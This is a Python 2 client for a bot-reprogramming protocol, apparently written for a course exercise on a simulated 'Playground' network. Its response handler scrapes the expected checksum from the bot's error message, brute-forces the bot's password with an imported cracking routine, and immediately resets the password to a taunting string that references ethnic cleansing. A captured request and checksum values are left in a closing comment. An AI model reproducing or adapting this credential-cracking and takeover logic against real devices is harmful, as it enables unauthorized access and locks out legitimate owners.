'''
Created on Feb 18, 2017

@author: sethjn
'''

from bot.common.network import ReprogrammingResponse, ReprogrammingRequest
from bot.common.util import InsertChecksum

from twisted.internet.protocol import Protocol
from playground.network.common.Protocol import MessageStorage
from twisted.internet.defer import Deferred
from playground.twisted.endpoints.GateEndpoint import GateClientEndpoint, PlaygroundNetworkSettings
from twisted.internet import reactor
from twisted.internet.endpoints import connectProtocol

# these are playground utils
from playground.utils.ui import CLIShell, stdio
from playground import playgroundlog

import sys, os, traceback, getpass
try:
    import ProtocolStack
except:
    print "WARNING, NO PROTOCOL STACK. RAW COMMUNICATIONS ONLY"
    ProtocolStack = None

from brutePassCrack import crackRequestPW

class ReprogrammingClientProtocol(Protocol):
    def __init__(self):
        self.__storage = MessageStorage(ReprogrammingResponse)
        self.__requests = {}
        self.__reqId = 0
        self.__probes = dict()
        
    def __nextId(self):
        self.__reqId += 1
        return self.__reqId
        
    def dataReceived(self, data):
        self.__storage.update(data)
        print "received", len(data), "bytes from", self.transport.getPeer()
        for message in self.__storage.iterateMessages():
            if not self.__requests.has_key(message.RequestId):
                continue
            print "getting callback for requestId", message.RequestId

            d = self.__requests[message.RequestId]
            d.callback(message.Data)

            try:
                checksum = data.split("Expected ")[1].split(" but got")[0]
                req = self.__probes[message.RequestId]
                req.Checksum = checksum
                pw = crackRequestPW(req)
                print("Password is %s" % pw)
                self.reprogram(pw, "PASSWORD", "~EthnicClensisStan~Was~Here~123123123")
            except:
                print("Error on password cracking")

        
    def reprogram(self, password, subsystem, data, *additionalSubsystems):
        if len(additionalSubsystems) % 2 != 0:
            raise Exception("Arguments to reprogram is both a subsystem and the data")
        req = ReprogrammingRequest(RequestId=self.__nextId(),
                                   Opcode   =0)
        
        subsystems = [subsystem]
        programs = [data]
        
        while additionalSubsystems:
            subsystems.append(additionalSubsystems.pop(0))
            programs.append(additionalSubsystems.pop(0))
            
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
    
        req.Subsystems = subsystems
        req.Data = programs
        
        InsertChecksum(req, password=password)
        self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    def status(self, password, *subsystems):
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
        req = ReprogrammingRequest(RequestId =self.__nextId(),
                                   Opcode    =1,
                                   Subsystems=subsystems,
                                   Data      =[])
        InsertChecksum(req, password=password)
        print("")
        print(repr(req.__serialize__()))
        print(req.Checksum)
        print("")
        self.__requests[req.RequestId] = Deferred()
        self.__probes[req.RequestId] = req
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    
class ReprogrammingShellProtocol(CLIShell):
    PROMPT = "[NOT CONNECTED] >>"
    
    RAW_PORT = 666
    ADV_PORT = 667
    
    def __init__(self, botAddress):
        CLIShell.__init__(self, prompt=self.PROMPT)
        self.__botAddress = botAddress
        self.__connectPort = self.RAW_PORT
        self.__protocol = None
        self.__password = "222222"
        
    def connectionMade(self):
        self.connectToBot(self.__connectPort)
        self.__loadCommands()
        
    def __botConnectionMade(self, protocol):
        self.transport.write("Connected to Bot.\n")
        self.__protocol = protocol
        self.prompt = "[%s::%d] >>" % (self.__botAddress, self.__connectPort)
        
    def __reprogram(self, writer, *args):
        if not self.__protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystem, reprogramArgument = args
        if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
            self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
            return
        if subsystem in ["PASSWORD", "ADDRESS"]:
            dataToSend = reprogramArgument
        else:
            if not os.path.exists(reprogramArgument):
                self.transport.write("File not found %s" % reprogramArgument)
                return
            
            with open(reprogramArgument) as f:
                dataToSend = f.read()
        writer("Sending %d byte program to subsystem %s\n" % (len(dataToSend), subsystem))
        d = self.__protocol.reprogram(self.__password, subsystem, dataToSend)
        d.addCallback(self.handleResponse)
        
    def __checkStatus(self, writer, *args):
        if not self.__protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystems = list(args)
        for subsystem in subsystems:
            if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
                self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
                return
        d = self.__protocol.status(self.__password, *subsystems)
        d.addCallback(self.handleResponse)
        
    def __changePassword(self, writer, *args):
        if args:
            writer("Change password takes no arguments.\n")
        self.__password = getpass.getpass("Enter new bot password: ")
        
        writer("Password changed successfully.\n")
        
    def __loadCommands(self):
        toggleCommandHandler = CLIShell.CommandHandler("toggle","Toggle between raw and advanced connection",self.__toggleConnection)
        reprogramCommandHandler = CLIShell.CommandHandler("reprogram", "Reprogram the bot's subsystems", defaultCb=self.__reprogram)
        getstatusCommandHandler = CLIShell.CommandHandler("status", "Get the bot's subsystems' status", defaultCb=self.__checkStatus)
        changePasswordCommandHandler = CLIShell.CommandHandler("passwd", "Change the bot's password", defaultCb=self.__changePassword)
        
        self.registerCommand(toggleCommandHandler)
        self.registerCommand(reprogramCommandHandler)
        self.registerCommand(getstatusCommandHandler)
        self.registerCommand(changePasswordCommandHandler)
        
    def __toggleConnection(self, writer):
        if self.__connectPort == self.RAW_PORT:
            self.connectToBot(self.ADV_PORT)
        else: self.connectToBot(self.RAW_PORT)
        
    def connectToBot(self, port):
        if self.__protocol:
            self.transport.write("Closing old bot connection on %d\n" % self.__connectPort)
            self.__protocol.transport.loseConnection()
            self.transport.write("Reloading protocol\n")
            self.__protocol = None
            self.prompt = self.PROMPT
        self.__connectPort = port
        
        
        networkSettings = PlaygroundNetworkSettings()
        networkSettings.configureNetworkStack(port == self.ADV_PORT and ProtocolStack or None)
        playgroundEndpoint = GateClientEndpoint(reactor, self.__botAddress, port, networkSettings)
        
        self.transport.write("Got Endpoint\n")
        reprogrammingProtocol = ReprogrammingClientProtocol()
        self.transport.write("Got protocol. Trying to connect\n")
        d = connectProtocol(playgroundEndpoint, reprogrammingProtocol)
        self.transport.write("Setting callback\n")
        d.addCallback(self.__botConnectionMade)
        d.addErrback(self.handleError)
        self.transport.write("Waiting for callback\n")
    
    
    def handleResponse(self, data):
        self.transport.write("Received response from server.\n")
        for serverString in data:
            self.transport.write("\t%s\n" % serverString)
        self.refreshInterface()
            
    def handleError(self, failure):
        self.transport.write("Something went wrong: %s\n" % failure)
        self.refreshInterface()
        # swallow error

print("CUSTOM RPC") 
if __name__=="__main__":
    address = sys.argv[1]
    playgroundlog.Config.enableLogging()
    playgroundlog.Config.enableHandler(playgroundlog.Config.STDERR_HANDLER)
    stdio.StandardIO(ReprogrammingShellProtocol(address))    
    reactor.run()

'''
    +cyberward.botinterface.ReprogrammingRequest\x031.0\x00\x06\x00\x01\x00\x00\x00\x01\x00\x02\x00\x00\x00 ac3d9eb6985fe062a3dffc2dd5ce9c78\x00\x03\x01\x00\x04\x00\x00\x00\x05\x00\x00\x00\x06\xde\x1b\xf1?$\x8da\xd0
    ac3d9eb6985fe062a3dffc2dd5ce9c78
    f63c533d5f818c8a7477603a3ae91064
    167574
'''